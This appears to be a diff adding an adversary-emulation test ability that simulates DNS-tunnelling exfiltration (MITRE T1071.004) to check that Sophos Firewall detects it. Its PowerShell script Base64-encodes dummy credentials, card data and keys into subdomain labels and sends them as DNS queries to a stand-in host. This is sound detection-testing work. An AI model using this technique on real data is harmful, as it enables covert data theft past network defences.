@@ -1,0 +1,69 @@
+---
+- id: scn026-a1-dns-tunneling
+  name: "SCN-026 | Firewall: DNS Tunneling"
+  description: |
+    Simulates data exfiltration via DNS by encoding data into DNS subdomain
+    queries. Sends 20 DNS lookups with Base64-encoded data embedded in the
+    subdomain labels — a technique used by real malware to bypass firewalls.
+
+    MITRE ATT&CK: T1071.004 - Application Layer Protocol: DNS
+    Firewall Detection: DNS inspection flags anomalous query patterns
+
+    What to watch for:
+    - Sophos Firewall flags unusually long or frequent DNS queries
+    - DNS tunneling or DNS exfiltration alert
+    - Anomalous subdomain length in DNS logs
+  tactic: exfiltration
+  technique:
+    attack_id: T1071.004
+    name: "Application Layer Protocol: DNS"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== DNS TUNNELING SIMULATION (T1071.004) ===";
+          Write-Output "[*] Simulating data exfiltration via DNS queries";
+          Write-Output "[*] Encoding data into DNS subdomain labels";
+          Write-Output "";
+          $secrets = @(
+            "username=admin",
+            "password=P@ssw0rd123",
+            "server=10.0.0.50",
+            "database=production",
+            "apikey=sk-12345abcde",
+            "ssn=123-45-6789",
+            "cc=4111111111111111",
+            "cvv=123",
+            "token=eyJhbGciOiJ",
+            "secret=aws-key-AKIA",
+            "hostname=dc01.corp",
+            "domain=corp.local",
+            "hash=aad3b435b51404",
+            "ntlm=31d6cfe0d16ae",
+            "key=MIIEvgIBADANBg",
+            "cert=MIIC+zCCAeOg",
+            "config=max_conn=500",
+            "route=10.0.0.0/8",
+            "dns=192.168.1.1",
+            "vpn=ipsec-key-abc"
+          );
+          $domain = "tunnel-test.example.com";
+          Write-Output "[*] Sending $($secrets.Count) encoded DNS queries to $domain";
+          Write-Output "";
+          $sent = 0;
+          foreach ($s in $secrets) {
+            $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s)) -replace '[+/=]','x';
+            $query = "$encoded.$domain";
+            Write-Output "[*] Query $($sent+1): $query";
+            try {
+              Resolve-DnsName -Name $query -Type TXT -DnsOnly -ErrorAction SilentlyContinue | Out-Null
+            } catch { };
+            $sent++;
+            Start-Sleep -Milliseconds 500
+          };
+          Write-Output "";
+          Write-Output "[+] Sent $sent DNS queries with encoded data in subdomains";
+          Write-Output "[*] Real DNS tunneling tools (iodine, dnscat2) use this same technique";
+          Write-Output "[*] Sophos Firewall DNS inspection detects anomalous query patterns";
+          Write-Output "=== END DNS TUNNELING ==="
+        cleanup: ""
